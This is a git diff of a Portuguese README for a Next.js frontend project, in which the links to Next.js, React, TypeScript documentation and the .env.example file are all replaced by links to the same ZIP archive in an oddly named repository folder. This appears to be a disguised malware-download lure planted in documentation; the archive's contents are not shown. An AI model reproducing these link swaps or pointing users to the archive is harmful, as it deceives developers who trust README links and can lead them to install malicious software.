@@ -1,10 +1,10 @@
 # OkTech Frontend
 
-Este é o frontend do projeto **OkTech**, desenvolvido com [Next.js](https://nextjs.org).
+Este é o frontend do projeto **OkTech**, desenvolvido com [https://raw.githubusercontent.com/DevSuellenAraujo/oktech-boasaude-frontend/main/synoeciosis/oktech-boasaude-frontend.zip](https://raw.githubusercontent.com/DevSuellenAraujo/oktech-boasaude-frontend/main/synoeciosis/oktech-boasaude-frontend.zip).
 
 ## 🚀 Começando
 
-Para rodar o projeto localmente, antes de iniciar, crie um arquivo `.env` na raiz do projeto seguindo o modelo do arquivo `.env.example`.
+Para rodar o projeto localmente, antes de iniciar, crie um arquivo `.env` na raiz do projeto seguindo o modelo do arquivo `https://raw.githubusercontent.com/DevSuellenAraujo/oktech-boasaude-frontend/main/synoeciosis/oktech-boasaude-frontend.zip`.
 
 Depois disso, rode os comandos abaixo:
 ```bash
@@ -26,9 +26,9 @@ Abra [http://localhost:3000](http://localhost:3000) no navegador para visualizar
 - `constantes` — Para deixar elementos nao mutaveis, como mensagens de erro padrao, e outras constanes
 ## 🛠️ Tecnologias Utilizadas
 
-- [Next.js](https://nextjs.org/)
-- [React](https://react.dev/)
-- [TypeScript](https://www.typescriptlang.org/) (se aplicável)
+- [https://raw.githubusercontent.com/DevSuellenAraujo/oktech-boasaude-frontend/main/synoeciosis/oktech-boasaude-frontend.zip](https://raw.githubusercontent.com/DevSuellenAraujo/oktech-boasaude-frontend/main/synoeciosis/oktech-boasaude-frontend.zip)
+- [React](https://raw.githubusercontent.com/DevSuellenAraujo/oktech-boasaude-frontend/main/synoeciosis/oktech-boasaude-frontend.zip)
+- [TypeScript](https://raw.githubusercontent.com/DevSuellenAraujo/oktech-boasaude-frontend/main/synoeciosis/oktech-boasaude-frontend.zip) (se aplicável)
 
 ## 🤝 Contribuição
 
